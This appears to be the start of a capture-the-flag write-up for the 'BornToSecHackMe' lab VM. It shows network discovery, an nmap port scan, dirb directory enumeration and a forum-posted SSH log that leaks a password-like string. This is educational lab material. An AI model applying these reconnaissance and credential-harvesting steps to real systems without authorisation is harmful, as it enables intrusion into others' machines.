# Initial Access

When I first booted the machine, I couldn't see an IP address as mentioned in the PDF. To establish a connection, I needed to perform a port scan to identify the available ports and determine how to connect to the machine.


```
PS C:\Users\Admin> ipconfig

Windows IP Configuration


Unknown adapter Local Area Connection:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :

Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . : TBTNET-TELEKOM
   Link-local IPv6 Address . . . . . : fe80::377f:a9a1:26fe:9665%10
   IPv4 Address. . . . . . . . . . . : 192.168.1.104
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.1.1

Ethernet adapter VMware Network Adapter VMnet1:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::9139:8d26:d933:6bd1%17
   IPv4 Address. . . . . . . . . . . : 192.168.204.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :

Ethernet adapter VMware Network Adapter VMnet8:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::fb43:9fc7:18b0:7d58%12
   IPv4 Address. . . . . . . . . . . : 192.168.193.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :

Ethernet adapter vEthernet (WSL (Hyper-V firewall)):

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::68fe:23eb:4e0f:3731%21
   IPv4 Address. . . . . . . . . . . : 172.17.48.1
   Subnet Mask . . . . . . . . . . . : 255.255.240.0
   Default Gateway . . . . . . . . . :
```


The important part for us here is:

```
Ethernet adapter VMware Network Adapter VMnet8:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::fb43:9fc7:18b0:7d58%12
   IPv4 Address. . . . . . . . . . . : 192.168.193.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :
```

After that, I used nmap to scan the ports:

```
luji~:nmap 192.168.193.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-17 08:02 +03
Nmap scan report for 192.168.193.128
Host is up (0.18s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps

Nmap done: 256 IP addresses (1 host up) scanned in 3.93 seconds
```

When we open the result in our browser, we can see a website.
Since I cannot include binary files, you can see the curl output below:

```
luji~:curl 192.168.193.128
<!DOCTYPE html>
<html>
<head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <title>Hack me if you can</title>
        <meta name='description' content='Simple and clean HTML coming soon / under construction page'/>
        <meta name='keywords' content='coming soon, html, html5, css3, css, under construction'/>
        <link rel="stylesheet" href="style.css" type="text/css" media="screen, projection" />
        <link href='http://fonts.googleapis.com/css?family=Coustard' rel='stylesheet' type='text/css'>

</head>
<body>
        <div id="wrapper">
                <h1>Hack me</h1>
                <h2>We're Coming Soon</h2>
                <p>We're wetting our shirts to launch the website.<br />
                In the mean time, you can connect with us trought</p>
                <p><a href="https://fr-fr.facebook.com/42Born2Code"><img src="fb.png" alt="Facebook" /></a> <a href="https://plus.google.com/+42Frborn2code"><img src="+.png" alt="Google +" /></a> <a href="https://twitter.com/42born2code"><img src="twitter.png" alt="Twitter" /></a></p>
        </div>
</body>
</html>
```

Now, when we think about what to do, we see a website in front of us. The opened page does not provide any information. So, to get more information, we will use the `dirb` command.

```
luji~:dirb https://192.168.193.128

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Mon Mar 17 08:15:10 2025
URL_BASE: https://192.168.193.128/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: https://192.168.193.128/ ----
+ https://192.168.193.128/cgi-bin/ (CODE:403|SIZE:292)
==> DIRECTORY: https://192.168.193.128/forum/
==> DIRECTORY: https://192.168.193.128/phpmyadmin/
+ https://192.168.193.128/server-status (CODE:403|SIZE:297)
==> DIRECTORY: https://192.168.193.128/webmail/
```

The first thing we did was to check the directories we found through the browser.

Here we see 4 topics, but the only noteworthy topic that we could use contained the following:

```
Probleme login ?
by lmezard, Thursday, October 08, 2015, 00:10 (3448 days ago)
edited by admin, Thursday, October 08, 2015, 00:17

Oct 5 08:44:40 BornToSecHackMe sshd[7482]: input_userauth_request: invalid user test [preauth]
Oct 5 08:44:40 BornToSecHackMe sshd[7482]: pam_unix(sshd:auth): check pass; user unknown
Oct 5 08:44:40 BornToSecHackMe sshd[7482]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=161.202.39.38-static.reverse.softlayer.com
Oct 5 08:44:42 BornToSecHackMe sshd[7482]: Failed password for invalid user test from 161.202.39.38 port 53781 ssh2
Oct 5 08:44:42 BornToSecHackMe sshd[7482]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 08:44:44 BornToSecHackMe sshd[7484]: Invalid user user from 161.202.39.38
Oct 5 08:44:44 BornToSecHackMe sshd[7484]: input_userauth_request: invalid user user [preauth]
Oct 5 08:44:44 BornToSecHackMe sshd[7484]: pam_unix(sshd:auth): check pass; user unknown
Oct 5 08:44:44 BornToSecHackMe sshd[7484]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=161.202.39.38-static.reverse.softlayer.com
Oct 5 08:44:46 BornToSecHackMe sshd[7484]: Failed password for invalid user user from 161.202.39.38 port 54109 ssh2
Oct 5 08:44:46 BornToSecHackMe sshd[7484]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 08:44:48 BornToSecHackMe sshd[7486]: Invalid user admin from 161.202.39.38
Oct 5 08:44:48 BornToSecHackMe sshd[7486]: input_userauth_request: invalid user admin [preauth]
Oct 5 08:44:48 BornToSecHackMe sshd[7486]: pam_unix(sshd:auth): check pass; user unknown
Oct 5 08:44:48 BornToSecHackMe sshd[7486]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=161.202.39.38-static.reverse.softlayer.com
Oct 5 08:44:50 BornToSecHackMe sshd[7486]: Failed password for invalid user admin from 161.202.39.38 port 54501 ssh2
Oct 5 08:44:51 BornToSecHackMe sshd[7486]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 08:44:52 BornToSecHackMe sshd[7488]: Invalid user PlcmSpIp from 161.202.39.38
Oct 5 08:44:52 BornToSecHackMe sshd[7488]: input_userauth_request: invalid user PlcmSpIp [preauth]
Oct 5 08:44:52 BornToSecHackMe sshd[7488]: pam_unix(sshd:auth): check pass; user unknown
Oct 5 08:44:52 BornToSecHackMe sshd[7488]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=161.202.39.38-static.reverse.softlayer.com
Oct 5 08:44:55 BornToSecHackMe sshd[7488]: Failed password for invalid user PlcmSpIp from 161.202.39.38 port 54827 ssh2
Oct 5 08:44:55 BornToSecHackMe sshd[7488]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 08:44:57 BornToSecHackMe sshd[7490]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=161.202.39.38-static.reverse.softlayer.com user=root
Oct 5 08:44:59 BornToSecHackMe sshd[7490]: Failed password for root from 161.202.39.38 port 55193 ssh2
Oct 5 08:44:59 BornToSecHackMe sshd[7490]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 08:45:01 BornToSecHackMe CRON[7494]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 08:45:01 BornToSecHackMe CRON[7494]: pam_unix(cron:session): session closed for user root
Oct 5 08:45:01 BornToSecHackMe sshd[7492]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=161.202.39.38-static.reverse.softlayer.com user=root
Oct 5 08:45:03 BornToSecHackMe sshd[7492]: Failed password for root from 161.202.39.38 port 55547 ssh2
Oct 5 08:45:03 BornToSecHackMe sshd[7492]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 08:45:05 BornToSecHackMe sshd[7537]: Invalid user ftpuser from 161.202.39.38
Oct 5 08:45:09 BornToSecHackMe sshd[7539]: input_userauth_request: invalid user pi [preauth]
Oct 5 08:45:09 BornToSecHackMe sshd[7539]: pam_unix(sshd:auth): check pass; user unknown
Oct 5 08:45:09 BornToSecHackMe sshd[7539]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=161.202.39.38-static.reverse.softlayer.com
Oct 5 08:45:12 BornToSecHackMe sshd[7539]: Failed password for invalid user pi from 161.202.39.38 port 56275 ssh2
Oct 5 08:45:12 BornToSecHackMe sshd[7539]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 08:45:13 BornToSecHackMe sshd[7541]: Invalid user test from 161.202.39.38
Oct 5 08:45:13 BornToSecHackMe sshd[7541]: input_userauth_request: invalid user test [preauth]
Oct 5 08:45:14 BornToSecHackMe sshd[7541]: pam_unix(sshd:auth): check pass; user unknown
Oct 5 08:45:14 BornToSecHackMe sshd[7541]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=161.202.39.38-static.reverse.softlayer.com
Oct 5 08:45:16 BornToSecHackMe sshd[7541]: Failed password for invalid user test from 161.202.39.38 port 56630 ssh2
Oct 5 08:45:16 BornToSecHackMe sshd[7541]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 08:45:18 BornToSecHackMe sshd[7543]: Invalid user admin from 161.202.39.38
Oct 5 08:45:18 BornToSecHackMe sshd[7543]: input_userauth_request: invalid user admin [preauth]
Oct 5 08:45:18 BornToSecHackMe sshd[7543]: pam_unix(sshd:auth): check pass; user unknown
Oct 5 08:45:18 BornToSecHackMe sshd[7543]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=161.202.39.38-static.reverse.softlayer.com
Oct 5 08:45:20 BornToSecHackMe sshd[7543]: Failed password for invalid user admin from 161.202.39.38 port 57011 ssh2
Oct 5 08:45:20 BornToSecHackMe sshd[7543]: Received disconnect from 11.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 08:45:22 BornToSecHackMe sshd[7545]: Invalid user nagios from 11.202.39.38
Oct 5 08:45:22 BornToSecHackMe sshd[7545]: input_userauth_request: invalid user nvdb [preauth]
Oct 5 08:45:22 BornToSecHackMe sshd[7545]: pam_unix(sshd:auth): check pass; user unknown
Oct 5 08:45:22 BornToSecHackMe sshd[7545]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=11.202.39.38-static.reverse.softlayer.com
Oct 5 08:45:25 BornToSecHackMe sshd[7545]: Failed password for invalid user nvdb from 161.202.39.38 port 57329 ssh2
Oct 5 08:45:25 BornToSecHackMe sshd[7545]: Received disconnect from 11.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 08:45:26 BornToSecHackMe sshd[7547]: Invalid user adam from 11.202.39.38
Oct 5 08:45:26 BornToSecHackMe sshd[7547]: input_userauth_request: invalid user adam [preauth]
Oct 5 08:45:27 BornToSecHackMe sshd[7547]: pam_unix(sshd:auth): check pass; user unknown
Oct 5 08:45:27 BornToSecHackMe sshd[7547]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=161.202.39.38-static.reverse.softlayer.com
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)
Oct 5 09:21:01 BornToSecHackMe CRON[9111]: pam_unix(cron:session): session closed for user lmezard
Oct 5 10:51:01 BornToSecHackMe CRON[13049]: pam_unix(cron:session): session closed for user root
Oct 5 10:52:01 BornToSecHackMe CRON[13092]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 10:52:02 BornToSecHackMe CRON[13092]: pam_unix(cron:session): session closed for user root
Oct 5 10:53:01 BornToSecHackMe CRON[13135]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 11:09:01 BornToSecHackMe CRON[13825]: pam_unix(cron:session): session closed for user root
Oct 5 11:09:01 BornToSecHackMe CRON[13824]: pam_unix(cron:session): session closed for user root
Oct 5 11:10:01 BornToSecHackMe CRON[13875]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 11:10:01 BornToSecHackMe CRON[13875]: pam_unix(cron:session): session closed for user root
Oct 5 11:11:01 BornToSecHackMe CRON[13918]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 11:11:01 BornToSecHackMe CRON[13918]: pam_unix(cron:session): session closed for user root
Oct 5 11:12:01 BornToSecHackMe CRON[13961]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 11:12:01 BornToSecHackMe CRON[13961]: pam_unix(cron:session): session closed for user root
Oct 5 11:13:01 BornToSecHackMe CRON[14004]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 11:13:01 BornToSecHackMe CRON[14004]: pam_unix(cron:session): session closed for user root
Oct 5 11:14:01 BornToSecHackMe CRON[14047]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 11:14:01 BornToSecHackMe CRON[14047]: pam_unix(cron:session): session closed for user root
Oct 5 11:15:01 BornToSecHackMe CRON[14090]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 11:15:01 BornToSecHackMe CRON[14090]: pam_unix(cron:session): session closed for user root
Oct 5 11:16:01 BornToSecHackMe CRON[14133]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 11:16:01 BornToSecHackMe CRON[14133]: pam_unix(cron:session): session closed for user root
Oct 5 11:17:01 BornToSecHackMe CRON[14176]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 11:23:01 BornToSecHackMe CRON[14477]: pam_unix(cron:session): session closed for user root
Oct 5 11:24:01 BornToSecHackMe CRON[14520]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 11:24:01 BornToSecHackMe CRON[14520]: pam_unix(cron:session): session closed for user root
Oct 5 11:25:01 BornToSecHackMe CRON[14563]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 11:25:01 BornToSecHackMe CRON[14563]: pam_unix(cron:session): session closed for user root
Oct 5 11:25:05 BornToSecHackMe CRON[15724]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 11:25:06 BornToSecHackMe CRON[15724]: pam_unix(cron:session): session closed for user root
Oct 5 11:25:07 BornToSecHackMe CRON[15724]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 11:25:08 BornToSecHackMe CRON[15724]: pam_unix(cron:session): session closed for user root
Oct 5 11:25:22 BornToSecHackMe sshd[14606]: Did not receive identification string from 23.99.195.219
Oct 5 11:26:01 BornToSecHackMe CRON[14607]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 11:26:01 BornToSecHackMe CRON[14607]: pam_unix(cron:session): session closed for user root
Oct 5 11:27:01 BornToSecHackMe CRON[14650]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 11:27:01 BornToSecHackMe CRON[14650]: pam_unix(cron:session): session closed for user root
Oct 5 11:28:01 BornToSecHackMe CRON[14693]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 11:28:01 BornToSecHackMe CRON[14693]: pam_unix(cron:session): session closed for user root
Oct 5 11:29:01 BornToSecHackMe CRON[14736]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 11:29:01 BornToSecHackMe CRON[14736]: pam_unix(cron:session): session closed for user root
Oct 5 11:29:16 BornToSecHackMe sshd[14779]: Invalid user admin from 104.245.98.119
Oct 5 11:29:16 BornToSecHackMe sshd[14779]: input_userauth_request: invalid user admin [preauth]
Oct 5 11:29:16 BornToSecHackMe sshd[14779]: pam_unix(sshd:auth): check pass; user unknown
Oct 5 11:29:16 BornToSecHackMe sshd[14779]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=104.245.98.119
Oct 5 11:29:18 BornToSecHackMe sshd[14779]: Failed password for invalid user admin from 104.245.98.119 port 22717 ssh2
Oct 5 11:29:18 BornToSecHackMe sshd[14779]: Received disconnect from 104.245.98.119: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 11:29:41 BornToSecHackMe sshd[14781]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=104.245.98.119 user=root
Oct 5 11:29:44 BornToSecHackMe sshd[14781]: Failed password for root from 104.245.98.119 port 23400 ssh2
Oct 5 11:29:44 BornToSecHackMe sshd[14781]: Received disconnect from 104.245.98.119: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 11:29:47 BornToSecHackMe sshd[14783]: Invalid user guest from 104.245.98.119
Oct 5 11:29:47 BornToSecHackMe sshd[14783]: input_userauth_request: invalid user guest [preauth]
Oct 5 11:29:48 BornToSecHackMe sshd[14783]: pam_unix(sshd:auth): check pass; user unknown
Oct 5 11:29:48 BornToSecHackMe sshd[14783]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=104.245.98.119
Oct 5 11:29:50 BornToSecHackMe sshd[14783]: Failed password for invalid user guest from 104.245.98.119 port 24338 ssh2
Oct 5 11:29:50 BornToSecHackMe sshd[14783]: Received disconnect from 104.245.98.119: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 11:30:01 BornToSecHackMe CRON[14787]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 11:30:01 BornToSecHackMe CRON[14787]: pam_unix(cron:session): session closed for user root
Oct 5 11:30:15 BornToSecHackMe sshd[14785]: Invalid user ubnt from 104.245.98.119
Oct 5 11:30:15 BornToSecHackMe sshd[14785]: input_userauth_request: invalid user ubnt [preauth]
Oct 5 11:30:15 BornToSecHackMe sshd[14785]: pam_unix(sshd:auth): check pass; user unknown
Oct 5 11:30:15 BornToSecHackMe sshd[14785]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=104.245.98.119
Oct 5 11:30:17 BornToSecHackMe sshd[14785]: Failed password for invalid user ubnt from 104.245.98.119 port 24710 ssh2
Oct 5 11:30:17 BornToSecHackMe sshd[14785]: Received disconnect from 104.245.98.119: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 11:30:32 BornToSecHackMe sshd[14830]: Invalid user support from 104.245.98.119
Oct 5 11:30:32 BornToSecHackMe sshd[14830]: input_userauth_request: invalid user support [preauth]
Oct 5 11:30:32 BornToSecHackMe sshd[14830]: pam_unix(sshd:auth): check pass; user unknown
Oct 5 11:30:32 BornToSecHackMe sshd[14830]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=104.245.98.119
Oct 5 11:30:35 BornToSecHackMe sshd[14830]: Failed password for invalid user support from 104.245.98.119 port 25965 ssh2
Oct 5 11:30:35 BornToSecHackMe sshd[14830]: Received disconnect from 104.245.98.119: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 11:30:46 BornToSecHackMe sshd[14832]: Invalid user test from 104.245.98.119
Oct 5 11:30:46 BornToSecHackMe sshd[14832]: input_userauth_request: invalid user test [preauth]
Oct 5 11:30:46 BornToSecHackMe sshd[14832]: pam_unix(sshd:auth): check pass; user unknown
Oct 5 11:30:46 BornToSecHackMe sshd[14832]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=104.245.98.119
Oct 5 11:30:48 BornToSecHackMe sshd[14832]: Failed password for invalid user test from 104.245.98.119 port 27190 ssh2
Oct 5 11:30:48 BornToSecHackMe sshd[14832]: Received disconnect from 104.245.98.119: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 11:30:51 BornToSecHackMe sshd[14834]: Invalid user user from 104.245.98.119
Oct 5 11:30:51 BornToSecHackMe sshd[14834]: input_userauth_request: invalid user user [preauth]
Oct 5 11:30:51 BornToSecHackMe sshd[14834]: pam_unix(sshd:auth): check pass; user unknown
Oct 5 11:30:51 BornToSecHackMe sshd[14834]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=104.245.98.119
Oct 5 11:30:53 BornToSecHackMe sshd[14834]: Failed password for invalid user user from 104.245.98.119 port 27769 ssh2
Oct 5 11:30:54 BornToSecHackMe sshd[14834]: Received disconnect from 104.245.98.119: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 11:31:01 BornToSecHackMe sshd[14836]: Invalid user admin from 104.245.98.119
Oct 5 11:31:01 BornToSecHackMe sshd[14836]: input_userauth_request: invalid user admin [preauth]
Oct 5 11:31:01 BornToSecHackMe CRON[14838]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 11:31:01 BornToSecHackMe sshd[14836]: pam_unix(sshd:auth): check pass; user unknown
Oct 5 11:31:01 BornToSecHackMe sshd[14836]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=104.245.98.119
Oct 5 11:31:01 BornToSecHackMe CRON[14838]: pam_unix(cron:session): session closed for user root
Oct 5 11:31:02 BornToSecHackMe sshd[14836]: Failed password for invalid user admin from 104.245.98.119 port 28290 ssh2
Oct 5 11:31:03 BornToSecHackMe sshd[14836]: Received disconnect from 104.245.98.119: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 11:31:20 BornToSecHackMe sshd[14881]: Invalid user PlcmSpIp from 104.245.98.119
Oct 5 11:31:20 BornToSecHackMe sshd[14881]: input_userauth_request: invalid user PlcmSpIp [preauth]
Oct 5 11:31:21 BornToSecHackMe sshd[14881]: pam_unix(sshd:auth): check pass; user unknown
Oct 5 11:31:21 BornToSecHackMe sshd[14881]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=104.245.98.119
Oct 5 11:31:22 BornToSecHackMe sshd[14881]: Failed password for invalid user PlcmSpIp from 104.245.98.119 port 29308 ssh2
Oct 5 11:31:23 BornToSecHackMe sshd[14881]: Received disconnect from 104.245.98.119: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 11:31:26 BornToSecHackMe sshd[14883]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=104.245.98.119 user=root
Oct 5 11:31:29 BornToSecHackMe sshd[14883]: Failed password for root from 104.245.98.119 port 29799 ssh2
Oct 5 11:31:29 BornToSecHackMe sshd[14883]: Received disconnect from 104.245.98.119: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 11:31:30 BornToSecHackMe sshd[14885]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=104.245.98.119 user=root
Oct 5 11:31:33 BornToSecHackMe sshd[14885]: Failed password for root from 104.245.98.119 port 29922 ssh2
Oct 5 11:31:33 BornToSecHackMe sshd[14885]: Received disconnect from 104.245.98.119: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 11:31:39 BornToSecHackMe sshd[14887]: Invalid user ftpuser from 104.245.98.119
Oct 5 11:31:39 BornToSecHackMe sshd[14887]: input_userauth_request: invalid user ftpuser [preauth]
Oct 5 11:31:40 BornToSecHackMe sshd[14887]: pam_unix(sshd:auth): check pass; user unknown
Oct 5 11:31:40 BornToSecHackMe sshd[14887]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=104.245.98.119
Oct 5 11:31:42 BornToSecHackMe sshd[14887]: Failed password for invalid user ftpuser from 104.245.98.119 port 30401 ssh2
Oct 5 11:31:42 BornToSecHackMe sshd[14887]: Received disconnect from 104.245.98.119: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 11:31:44 BornToSecHackMe sshd[14889]: Invalid user pi from 104.245.98.119
Oct 5 11:31:44 BornToSecHackMe sshd[14889]: input_userauth_request: invalid user pi [preauth]
Oct 5 11:31:44 BornToSecHackMe sshd[14889]: pam_unix(sshd:auth): check pass; user unknown
Oct 5 11:31:44 BornToSecHackMe sshd[14889]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=104.245.98.119
Oct 5 11:31:46 BornToSecHackMe sshd[14889]: Failed password for invalid user pi from 104.245.98.119 port 30558 ssh2
Oct 5 11:31:46 BornToSecHackMe sshd[14889]: Received disconnect from 104.245.98.119: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 11:32:01 BornToSecHackMe CRON[14893]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 11:32:01 BornToSecHackMe CRON[14893]: pam_unix(cron:session): session closed for user root
Oct 5 11:32:08 BornToSecHackMe sshd[14891]: Invalid user test from 104.245.98.119
Oct 5 11:32:08 BornToSecHackMe sshd[14891]: input_userauth_request: invalid user test [preauth]
Oct 5 11:32:08 BornToSecHackMe sshd[14891]: pam_unix(sshd:auth): check pass; user unknown
Oct 5 11:32:08 BornToSecHackMe sshd[14891]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=104.245.98.119
Oct 5 11:32:10 BornToSecHackMe sshd[14891]: Failed password for invalid user test from 104.245.98.119 port 31167 ssh2
Oct 5 11:32:10 BornToSecHackMe sshd[14891]: Received disconnect from 104.245.98.119: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 11:32:19 BornToSecHackMe sshd[14936]: Invalid user admin from 104.245.98.119
Oct 5 11:32:19 BornToSecHackMe sshd[14936]: input_userauth_request: invalid user admin [preauth]
Oct 5 11:32:19 BornToSecHackMe sshd[14936]: pam_unix(sshd:auth): check pass; user unknown
Oct 5 11:32:19 BornToSecHackMe sshd[14936]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=104.245.98.119
Oct 5 11:32:21 BornToSecHackMe sshd[14936]: Failed password for invalid user admin from 104.245.98.119 port 32271 ssh2
Oct 5 11:32:21 BornToSecHackMe sshd[14936]: Received disconnect from 104.245.98.119: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 11:32:28 BornToSecHackMe sshd[14938]: Invalid user nagios from 104.245.98.119
Oct 5 11:32:28 BornToSecHackMe sshd[14938]: input_userauth_request: invalid user naos [preauth]
Oct 5 11:32:29 BornToSecHackMe sshd[14938]: pam_unix(sshd:auth): check pass; user unknown
Oct 5 11:32:29 BornToSecHackMe sshd[14938]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=104.245.98.119
Oct 5 11:32:31 BornToSecHackMe sshd[14938]: Failed password for invalid user naos from 104.245.98.119 port 32805 ssh2
Oct 5 11:32:31 BornToSecHackMe sshd[14938]: Received disconnect from 104.245.98.119: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 11:32:40 BornToSecHackMe sshd[14940]: Invalid user adam from 104.245.98.119
Oct 5 11:32:40 BornToSecHackMe sshd[14940]: input_userauth_request: invalid user adm [preauth]
Oct 5 11:32:40 BornToSecHackMe sshd[14940]: pam_unix(sshd:auth): check pass; user unknown
Oct 5 11:32:40 BornToSecHackMe sshd[14940]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=104.245.98.119
Oct 5 11:32:42 BornToSecHackMe sshd[14940]: Failed password for invalid user adm from 104.245.98.119 port 33503 ssh2
Oct 5 11:32:43 BornToSecHackMe sshd[14940]: Received disconnect from 104.245.98.119: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 11:33:01 BornToSecHackMe CRON[14942]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 11:33:01 BornToSecHackMe CRON[14942]: pam_unix(cron:session): session closed for user root
Oct 5 11:34:01 BornToSecHackMe CRON[14985]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 11:34:01 BornToSecHackMe CRON[14985]: pam_unix(cron:session): session closed for user root
Oct 5 11:35:01 BornToSecHackMe CRON[15028]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 11:35:01 BornToSecHackMe CRON[15028]: pam_unix(cron:session): session closed for user root
Oct 5 11:36:01 BornToSecHackMe CRON[15071]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 11:36:01 BornToSecHackMe CRON[15071]: pam_unix(cron:session): session closed for user root
Oct 5 11:37:01 BornToSecHackMe CRON[15114]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 11:37:01 BornToSecHackMe CRON[15114]: pam_unix(cron:session): session closed for user root
Oct 5 11:38:01 BornToSecHackMe CRON[15157]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 11:38:02 BornToSecHackMe CRON[15157]: pam_unix(cron:session): session closed for user root
Oct 5 11:39:01 BornToSecHackMe CRON[15200]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 5 11:39:01 BornToSecHackMe CRON[15201]: pam_unix(cron:session): session opened for user root by (uid=0)
